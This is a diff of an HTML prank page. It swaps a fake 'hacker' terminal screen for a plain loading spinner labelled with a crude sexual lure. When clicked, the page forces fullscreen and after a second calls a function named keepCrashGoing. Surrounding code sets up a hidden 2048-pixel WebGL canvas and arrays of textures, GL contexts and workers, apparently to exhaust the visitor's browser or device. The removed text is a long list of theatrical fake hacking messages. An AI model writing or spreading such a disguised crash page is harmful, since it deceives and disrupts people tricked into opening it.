@@ -4,69 +4,107 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    * {
+      box-sizing: border-box;
+    }
+    
     body {
-      background: black;
-      color: lime;
-      font-family: "Courier New", monospace;
+      background: #0a0a0c;
       margin: 0;
       overflow: hidden;
       height: 100vh;
-    }
-
-    #hackMessage {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
-      font-size: 80px;
-      color: white;
-      font-family: sans-serif;
-      background: black;
-      cursor: pointer;
-      z-index: 1000;
-      user-select: none;
+      color: #ffffff;
     }
 
-    .hackerText {
+    .loader-container {
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 24px;
+      cursor: pointer;
+      user-select: none;
+      transition: transform 0.2s ease;
+    }
+
+    .loader-container:active {
+      transform: scale(0.97);
+    }
+
+    /* Rotating Slider / Progress Ring */
+    .slider-wrapper {
+      position: relative;
+      width: 100px;
+      height: 100px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .track {
       position: absolute;
-      top: 0;
-      left: 0;
-      font-size: 14px;
-      white-space: nowrap;
-      overflow: hidden;
-      z-index: 500;
       width: 100%;
       height: 100%;
-      pointer-events: none;
+      border: 4px solid rgba(255, 255, 255, 0.05);
+      border-radius: 50%;
     }
 
-    .hackerText span {
-      display: block;
-      animation: scrollText 10s linear infinite;
+    .static-ring {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid transparent;
+      border-top: 4px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transition: all 0.3s ease;
     }
 
-    @keyframes scrollText {
-      0% { top: -100%; }
-      100% { top: 100%; }
+    .rotator {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid transparent;
+      border-top: 4px solid #3b82f6;
+      border-radius: 50%;
+      animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+      display: none;
     }
-  </style>a
+
+    .status-text {
+      font-size: 16px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      color: rgba(255, 255, 255, 0.6);
+      transition: color 0.3s ease;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
 
-  <div id="hackMessage" onclick="startHack()">
-    Click to find a fuck mate 🤤🥵
+  <div class="loader-container" id="interactiveZone" onclick="startLoading()">
+    <div class="slider-wrapper">
+      <div class="track"></div>
+      <div class="static-ring" id="staticRing"></div>
+      <div class="rotator" id="rotatorRing"></div>
+    </div>
+    <div class="status-text" id="statusLabel">Click here to find a fuck mate 🤤🥵</div>
   </div>
 
-  <div class="hackerText" id="hackerText"></div>
-
   <script>
-    const status = document.getElementById('hackMessage');
-    const hackerText = document.getElementById('hackerText');
-    let ramChunks = [];
+    const interactiveZone = document.getElementById('interactiveZone');
+    const statusLabel = document.getElementById('statusLabel');
+    const staticRing = document.getElementById('staticRing');
+    const rotatorRing = document.getElementById('rotatorRing');
+    
     let textures = [];
     let gls = [];
     let workers = [];
@@ -75,6 +113,7 @@
     const canvas = document.createElement('canvas');
     canvas.width = 2048;
     canvas.height = 2048;
+    canvas.style.display = 'none';
     document.body.appendChild(canvas);
     const gl = canvas.getContext('webgl');
 
@@ -128,8 +167,12 @@
       requestAnimationFrame(animate);
     }
 
-    function startHack() {
-      status.style.display = 'none';
+    function startLoading() {
+      staticRing.style.display = 'none';
+      rotatorRing.style.display = 'block';
+      statusLabel.textContent = "Finding a Match...";
+      statusLabel.style.color = "#3b82f6";
+      
       if (!fullScreen) {
         const doc = document.documentElement;
         if (doc.requestFullscreen) doc.requestFullscreen();
@@ -139,131 +182,9 @@
         fullScreen = true;
       }
 
-      createHackerEffect();
-
       setTimeout(() => {
         keepCrashGoing();
       }, 1000);
-    }
-
-    function createHackerEffect() {
-      const hackerLines = [
-        "ACCESSING MAINFRAME...",
-        "HACKER INTRUSION DETECTED",
-        "INITIATING SYSTEM OVERRIDE",
-        "SECURITY BREACH CONFIRMED",
-        "LOADING MALWARE...",
-        "BYPASSING FIREWALL...",
-        "TRANSMITTING FILES TO REMOTE SERVER...",
-        "DECODING ENCRYPTION ALGORITHM...",
-        "ACCESSING DATABASE...",
-        "MALWARE ACTIVATED...",
-        "DISABLING SYSTEM PROTECTIONS...",
-        "OVERRIDING ADMIN CREDENTIALS...",
-        "DEPLOYING RANSOMWARE...",
-        "EXFILTRATING DATA...",
-        "SYSTEM INFECTION COMPLETE...",
-        "ALL SYSTEMS COMPROMISED...",
-        "HACKER REMOTE ACCESS ESTABLISHED",
-        "COMPLETING MALICIOUS ACTIVITIES...",
-        "ESTABLISHING PERSISTENT BACKDOOR...",
-        "DEPLOYING ADVANCED TROJANS...",
-        "SYSTEM WIPE IN PROGRESS...",
-        "ESTABLISHING SSL TUNNEL VIA PORT 8080...",
-        "BRUTE-FORCING AES-256 ENCRYPTION KEY...",
-        "PACKET SNIFFING INITIALIZED [TCP/IP]...",
-        "SPOOFING MAC ADDRESS: 00:1A:2B:3C:4D:5E...",
-        "INJECTING SQL PAYLOAD...",
-        "ROOT ACCESS GRANTED: /USR/BIN/BASH...",
-        "OVERRIDING KERNEL SECURITY POLICIES...",
-        "MAPPING NETWORK TOPOLOGY...",
-        "BYPASSING MULTI-FACTOR AUTHENTICATION...",
-        "UPDATING EXPLOIT DATABASE... [V9.4.2]",
-        "DUMPING HASHED PASSWORDS...",
-        "PURGING SYSTEM LOGS TO EVADE DETECTION...",
-        "CRITICAL ERROR: BIOMETRIC SCAN BYPASSED",
-        "WARNING: TRACE ROUTE DETECTED. ACTIVATING PROXY...",
-        "REDIRECTING SATELLITE UPLINK...",
-        "CORE TEMPERATURE RISING... OVERRIDING THERMALS...",
-        "ENCRYPTION KEY FOUND: 0x7FFD2B1A...",
-        "CONNECTION STABILIZED. WELCOME, ADMIN.",
-        "SCANNING FOR VULNERABILITIES...",
-        "EXPLOITING ZERO-DAY VULNERABILITY...",
-        "UPLOADING ROOTKIT TO BIOS...",
-        "INTERCEPTING HANDSHAKE PROTOCOL...",
-        "CLONING RUNTIME ENVIRONMENT...",
-        "DECRYPTING RSA-4096 BITSTREAM...",
-        "HIJACKING SESSION COOKIES...",
-        "ESCALATING PRIVILEGES TO UID 0...",
-        "BYPASSING KERNEL ASLR PROTECTION...",
-        "INJECTING DLL INTO SYSTEM PROCESS...",
-        "ESTABLISHING REVERSE SHELL...",
-        "ROTATING PROXY CHAIN: [DE, NL, JP, RU]...",
-        "DEFEATING IDS/IPS SIGNATURES...",
-        "HARVESTING ACTIVE DIRECTORY TOKENS...",
-        "DRAINING SYSTEM ENTROPY...",
-        "CORRUPTING SECTOR 0 BOOT RECORD...",
-        "OVERRIDING SCADA CONTROLS...",
-        "INITIALIZING COLD-BOOT ATTACK...",
-        "BYPASSING SECURE BOOT VERIFICATION...",
-        "BUFFER OVERFLOW DETECTED AT 0x0045AF...",
-        "SYN FLOODING TARGET GATEWAY...",
-        "MAN-IN-THE-MIDDLE ATTACK ACTIVE...",
-        "OVERRIDING POWER GRID FREQUENCY...",
-        "EXTRACTING PRIVATE RSA KEYS...",
-        "REMOTE CODE EXECUTION SUCCESSFUL...",
-        "PHISHING FOR SECONDARY CREDENTIALS...",
-        "SPOOFING DNS RESOLVER...",
-        "DECRYPTING LOCAL STORAGE VAULT...",
-        "OVERRIDING VOLTAGE REGULATORS...",
-        "INJECTING KEYLOGGER INTO HID DRIVER...",
-        "REDIRECTING PACKET FLOW TO VIRTUAL BRIDGE...",
-        "ESTABLISHING PEER-TO-PEER BOTNET NODE...",
-        "BYPASSING HARDWARE ENCLAVE...",
-        "SCANNING CLOUD INSTANCE BUCKETS...",
-        "OVERRIDING LOGICAL LUN MAPPINGS...",
-        "PURGING SHADOW COPIES...",
-        "DISABLING ANTIVIRUS REAL-TIME SHIELD...",
-        "SPOOFING GPS COORDINATES...",
-        "INTERCEPTING VOIP DATA STREAM...",
-        "DECOMPILING PROPRIETARY BINARIES...",
-        "BYPASSING AIR-GAP VIA ACOUSTIC LEAK...",
-        "INITIALIZING SIDE-CHANNEL ANALYSIS...",
-        "OVERWRITING FIRMWARE MICROCODE...",
-        "BYPASSING CAPTCHA VERIFICATION...",
-        "CLONING RFID ACCESS CARD...",
-        "ESTABLISHING VPN TUNNEL... [STABLE]",
-        "CRACKING NTLM HASHES...",
-        "OVERRIDING HVAC CONTROL SYSTEM...",
-        "BYPASSING SANDBOX ENVIRONMENT...",
-        "INJECTING SHELLCODE INTO HEAP...",
-        "ESTABLISHING HIDDEN PARTITION...",
-        "OVERRIDING OPTICAL DRIVE FIRMWARE...",
-        "BYPASSING SMART CARD AUTHENTICATION...",
-        "CLONING SYSTEM REGISTRY...",
-        "ESTABLISHING PERSISTENCE VIA CRONJOB...",
-        "BYPASSING FIREWALL STATEFUL INSPECTION...",
-        "INJECTING MALICIOUS SCRIPT INTO DOM...",
-        "ESTABLISHING ENCRYPTED C2 CHANNEL...",
-        "OVERRIDING EMERGENCY SHUTDOWN PROTOCOL...",
-        "BYPASSING HARDWARE ABSTRACTION LAYER...",
-        "SYSTEM OWNED. INITIALIZING FINAL PAYLOAD."
-      ];
-
-      let lineIndex = 0;
-      hackerText.style.overflowY = "auto";
-
-      function addLines() {
-        const newLine = document.createElement('div');
-        newLine.textContent = hackerLines[lineIndex];
-        hackerText.appendChild(newLine);
-        hackerText.scrollTop = hackerText.scrollHeight;
-        lineIndex = (lineIndex + 1) % hackerLines.length;
-        const delay = Math.floor(Math.random() * (50 - 5 + 1)) + 5;
-        setTimeout(addLines, delay);
-      }
-
-      addLines();
     }
 
     function keepCrashGoing() {
